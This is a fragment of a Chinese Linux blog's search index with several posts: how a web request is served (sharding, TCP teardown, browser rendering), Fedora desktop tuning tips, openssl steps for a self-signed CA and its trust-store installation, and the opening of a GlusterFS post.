后台统一处理请求，处理完后响应结果.一般后端都是有统一的验证的，如安全拦截，跨域验证.如果这一步不符合规则，就直接返回了相应的http报文（如拒绝请求等） 然后当验证通过后，才会进入实际的后台代码，此时是程序接收到请求，然后执行（譬如查询数据库，大量计算等等） 等程序执行完毕后，就会返回一个http响应包 关于数据库 对于数亿用户的存储 合理设计数据库字段 创建索引 分库分表 水平分库分表 对单个指标通过Hash等方式分散在多个库或表中 简单来说就是把一个表的数据划分到不同的数据库,两个数据库的表结构一样,根据一点的规则来划分数据库,查询的时候也根据一定的规则知悉在哪个数据库 垂直分库分表 将不同业务指标分散在不同库和表 简单来说,就是按照业务功能等划分,比如说把收藏夹和购物车放到不同的库中 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:12:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.12. 服务端提供响应 服务端处理完请求后,会将所请求的东西响应给客户端 服务器会以同样的顺序同样的方式将响应数据包发送都客户端 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:13:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.13. 四次挥手 在这种短链接下,当客户端接受到服务端的响应后进行挥手操作 第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。 第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。 第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。 第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态。 服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:14:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.13.1. 通俗点说就是: 客户端:“我要下了,还有什么想跟我说的吗?” 服务端:“等等,上一句还没说完” 服务端发完后说:“好了,说完了” 客户端:“我知道了,拜拜” ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:14:1","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.14. 浏览器解析和渲染 解析HTML,构建DOM树 HTML文档会被解析成一棵以document为根的DOM树，解析过程中如果遇到JavaScript，则会暂停解析并传输下载相应的文件造成阻塞，故推荐将JavaScript脚本放在HTML文件的后面。 构建CSSSOM树 浏览器根据外部样式，内部样式和内联样式来解析CSS，构建CSSSOM树。 构建渲染树和布局 DOM树和CSSOM树构建完毕后会融合成渲染树，然后浏览器会确认页面各元素的位置。 页面绘制和优化 浏览器根据布局结果进行页面的绘制，并优化页面内容，减小CPU消耗。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:15:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.15. 交互结束 这时如果以上步骤都不出意外,就得到我们想要访问的网页了.在我们输入网址到网页展示短短几秒的过程中就大致经历了这么多过程. 客户端到服务端如上所示,看似只有一次交互,其实中间过程中已经交互了多次,比如握手过程,都是需要进行发包交互的. 还有很多需要细化没有涉及到的点,后面自己再慢慢思考.若有思考错误的地方,还望指出. ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:16:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"日志切割工具Logrotate详解","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/","tags":["linux","日志"],"title":"日志切割工具Logrotate详解","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" Logrotate 程序是一个日志文件管理工具。用于分割日志文件，压缩转存、删除旧的日志文件，并创建新的日志文件 https://cloud.tencent.com/developer/article/1681716 ","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","日志"],"title":"日志切割工具Logrotate详解","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","那些有用没用的"],"content":"Fedora优化","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":" 前言 以下的一些优化应该是我还在用fedora26的时候记录的，虽然现在我已经都更新到33了，不过这些优化还是有点用的，可以参考着改, 后续遇到的问题我也在慢慢更新上来。 目前已更新到fedora 38 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:0:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"2. 安装鼠标右键“在终端中打开”，33中默认好像已经有了 [root@cxd ~]$ sudo dnf install nautilus-open-terminal ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:1:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"3. 安装 GNOME-tweak-tool $\u003e sudo dnf install gnome-tweak-tool ## 扩展库安装 ### Dash to dock (可选:Dash to panel) ### system-monitor ### Recent(Item)s (fedora 38 已无，暂为找到替代方案) ### Topicons plus git(fedora 38 已无,切换为 AppIndicator and KStatusNotifierItem Support) ### Drop down terminal(fedora 38 已无) ### Clipboard indicator(可以切换为 Clipboard History 或者 Pano 、 或者使用 copyq (推荐) ) ### Todo.txt ### Bottompanel(将任务栏放到下面,与windows list 和 Dash to panel 扩展冲突) ## 扩展字体修正 # Drop down terminal: FONT_NAME_SETTING_KEY == monospace-font-name # org.gnome.desktop.interface # gsettings set org.gnome.desktop.interface monospace-font-name 'Source Code Pro 15' ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:2:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"4. 安装一些好用的额外工具和包 $\u003e sudo dnf install flameshot # 火焰截图,很好用,拥有win下面截图软件的一些功能 $\u003e sudo dnf install audacity # 声音处理工具,实际好像没啥用 $\u003e sudo dnf install peek # gif 图像录制工具 $\u003e sudo dnf install inkscape # 矢量图画画工具 $\u003e sudo dnf install sleek # todo 任务(https://github.com/ransome1/sleek) $\u003e sudo dnf install libreoffice-langpack-zh-Hans.x86_64 # libreoffice的中文语言包 $\u003e sudo pip3 install bpython # https://flathub.org/zh-Hans/apps/io.github.flattool.Warehouse # flatpak 管理工具 # https://flathub.org/zh-Hans/apps/com.github.tchx84.Flatseal # flatpak 权限管理工具 # https://flathub.org/zh-Hans/apps/io.github.giantpinkrobots.flatsweep # flatpak 卸载残留清理工具(fedora38下运行不稳定) ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:3:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"5. 安装ficx输入法 https://blog.csdn.net/qq23425352/article/details/107379335 $\u003e $\u003e sudo dnf install fcitx fcitx-{ui-light,qt{4,5},table,gtk{2,3},table-chinese,configtool,sunpinyin} $\u003e sudo vim /etc/profile.d/fcitx.sh export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" # 开机启动项 添加fcitx ，然后重启 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:4:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"6. fedroa下多jdk切换方案 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --config java 共有 3 个提供“java”的程序。 选项 命令 ----------------------------------------------- * 1 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-10.b14.fc25.x86_64/jre/bin/java) 2 /opt/jdk1.8.0_121/bin/java 按 Enter 保留当前选项[+]，或者键入选项编号：2 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:5:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"7. 系统bug优化-显卡 此方法解决了nouveau 对于nvidia显卡支持不好从而导致了gnome在锁屏状态卡死,从而无法登陆桌面,只能重启操作系统 (双显卡电脑). # 1. 修改文件 /etc/default/grub # 2. 修改行 GRUB_CMDLINE_LINUX 在末尾添加 nouveau.modeset=0 # 3. 更新gurb: grub2-mkconfig -o /boot/grub2/grub.cfg # 4. 重启 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:6:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"8. 系统bug优化-蓝牙 这也可能不是一个bug,具体问题是蓝牙鼠标连接后一段时间未使用电脑和鼠标,蓝牙将会自动被断开,但系统仍然显示连接中,手动断开后也无法在进行连接,只能删除原有连接然后重新配对, 多次查询相关无果后对蓝牙的相关配置文件进行检查,发现系统设置里面对于蓝牙有DiscoverableTimeout这么一个参数,此参数作用是设置蓝牙保持发现的最长时间,默认180秒. 修改此参数后问题解决. # 解决方案 # 1. 修改配置文件 /etc/bluetooth/main.conf # 2. 修改 DiscoverableTimeout=0 # 另: fedora官网wiki提供了另一种解决方案,说的大概是大部分的自动断开都是因为蓝牙服务未以守护进程方式运行,解决方案是 ## https://fedoraproject.org/wiki/How_to_debug_Bluetooth_problems#Simple_debugging # 1. 修改配置文件 /usr/lib/systemd/system/bluetooth.service # 2. 修改参数 ExecStart 在末尾添加 -d # 重启 systemctl restart bluetooth.service ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:7:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"9. systemd 添加后无权限启动问题 .service: Failed to execute command: Permission denied 此问题实际上是由于selinux开启enforcing(强制模式)导致的,一般的fedora用户应该都不会去关闭selinux吧，只有在服务器上为了方便才会去关闭,解决这个问题的方法有两种，一种是关闭selinux,或者将selinux设置为permissive(宽容模式),第二种就是直接修正上下文权限为bin_t,这个具体可以看下系统中其他可执行文件的上下文权限是什么(ls -Z),修改命令是chcon -t bin_t \u003cbinaryfile\u003e,另外.service命名在systemd配置目录中了，systemctl status时却看不到,也是这个问题，这个问题也是我直接复制v2ray的时候发现的，这儿记录下. ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:8:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"10. fedora 32 启用 docker https://linux.cn/article-12433-1.html ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:9:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"11. fedora 33 下修改Wayland桌面为x11 $\u003e vim /etc/gdm/custom.conf [daemon] # Uncomment the line below to force the login screen to use Xorg WaylandEnable=false DefaultSession=gnome-xorg.desktop #AutomaticLoginEnable=true #AutomaticLogin=cxd ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:10:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"12. fedora 无法连接pptp(已解决) 原因是防火墙需要开启gre协议放行,以下是firewalld配置，可能linux用户都有这种情况,若其他类型vpn也出现无法连接情况，可能也是这个原因 $\u003e firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 0 -p gre -j ACCEPT $\u003e firewall-cmd --permanent --direct --add-rule ipv6 filter INPUT 0 -p gre -j ACCEPT # 如果上述配置仍然无效,那么你可能需要在连接高级中勾选\"使用点到点加密(MPPE)(P)\"选项 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:11:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"13. fedora 升级到指定版本 ## 更新系统 $\u003e sudo dnf upgrade --refresh ## 安装dnf-plugin-system-upgrade包 $\u003e sudo dnf install dnf-plugin-system-upgrade ## 下载最新的 Fedora 更新包 $\u003e sudo dnf system-upgrade download --releasever=35 ## 重启升级 $\u003e sudo dnf system-upgrade reboot ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:12:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"14. fedora下登陆密钥环未被解锁问题 默认情况下，系统安装后，密钥环密码和基础帐号安装时候的密码一致，这个东西个人电脑感觉没什么用，可以通过以下方式进行取消 # fedora 下默认是没有安装seahorse的(本来我原来也没有找到解决方案，无意间测试ubuntu才发现这个) $\u003e sudo dnf install seahorse # 活动栏中找到\"密码和密钥\"(及\"seahorse\"), 打开后找到登陆, 右键登陆，设置为空密码即可。 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:13:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"15. flatpak 应用如何挂载指定目录到应用环境中 以 微信(Universal) 为例, 由于flatpak默认的沙盒保护机制，只有部分目录映射到了沙盒中。根据作者(web1n)打包的仓库issue #14可有多种解决方案，本站仅记录一种，其他请直接查看issue #14。 # 安装 Flatseal ## https://flathub.org/apps/com.github.tchx84.Flatseal $\u003e flatpak install flathub com.github.tchx84.Flatseal ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:14:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"16. fedroa 取消关机时候提示安装挂起的软件更新的默认勾选 # https://discussion.fedoraproject.org/t/disable-gnome-software-update-notifications/78209/2 $\u003e gsettings set org.gnome.software allow-updates false ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:15:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"17. gnome 桌面 alt+tab 切换窗口，浏览器多窗口被视为同一组的问题 在系统中的键盘-键盘快捷键-导航 中，将切换应用程序的快捷键删了，将切换窗口快捷键改为alt+tab即可解决 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:16:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":"18. fedora 38 没有声音/音频设置 OP电脑体现是, 系统设置里面没有声音设置(应该是看不到输入和输出的设备管理)，蓝牙连接声音传递正常，但无法加减音量, 耳机线连接异常 解决方案: 注释掉 /etc/pulse/default.pa: 110 中 load-module module-suspend-on-idle , 然后pulseaudio -k、pulseaudio --start 一下(重启应该也可以), 具体可以看一下 https://discussion.fedoraproject.org/t/no-sound-audio-in-fedora-38/81903 ","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:17:0","tags":["linux","fedora"],"title":"FEDORA优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"自签证书的生成及可信列表的添加","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1. 正文 ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:1:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.1. 生成 CA 私钥 # 此处需要让你设置一个密码(好像可以直接忽略密码,但不晓得怎么操作) ## openssl genrsa -out ca.key 4096 openssl genrsa -des3 -out ca.key 4096 # 移除出私钥密码 openssl rsa -in ca.key -out ca.key ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:2:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.2. 生成 ca 证书 subj 参数说明 字段 字段含义 示例 /C= Country 国家 CN /ST= State or Province 省 Chongqing /L= Location or City 城市 Shapingba /O= Organization 组织或企业 0x5c0f /OU= Organization Unit 部门 ops /CN= Common Name 域名或IP blog.0x5c0f.cc openssl req -utf8 -x509 -new -nodes -key ca.key -sha512 -days 18250 -out ca.pem -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f/emailAddress=mail@0x5c0f.cc\" ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:3:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.3. 生成证书私钥 openssl genrsa -out server.key 4096 ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:4:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.4. 生成域名签名 openssl req -new -key server.key -out server.csr -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f.cc/emailAddress=mail@0x5c0f.cc\" ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:5:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.5. 创建扩展 后续有新域名,直接加入进去即可 cat \u003e server.ext \u003c\u003cEOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth, codeSigning subjectAltName = @alt_names [alt_names] DNS.1 = *.0x5c0f.cc DNS.2 = *.51ac.cc DNS.3 = localhost IP.1 = 127.0.0.1 EOF ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:6:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.6. 生成域名证书 openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 1825 -sha512 -extfile server.ext ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:7:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.7. 可信列表添加 ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:8:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.7.1. linux https://qastack.cn/unix/90450/adding-a-self-signed-certificate-to-the-trusted-list 以fedroa32为例 sudo cp -v ca.pem /etc/pki/ca-trust/source/anchors/ca.pem sudo update-ca-trust ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:8:1","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1.7.2. windows 以win 10为例 win + R 打开运行窗口, 键入 mmc 然后回车, 选择 文件-添加/删除单元节点。选择证书-添加，打开选项卡自行判断选择，完成即可。 上述完成后，在mmc控制台中就可以看到证书节点, 展开证书-受信任的根证书颁发机构，选择其下面证书,然后右键 所有任务-导入,导入生成的ca.pem即可，退出时会提示存储控制台的信息，可以忽略 ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:8:2","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"分布式文件系统_GlusterFS","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"1. 前言 分布式文件存储 实验环境： 1. centos7.x 2台 (node11，node12) 2. glusterfs 4.1.6 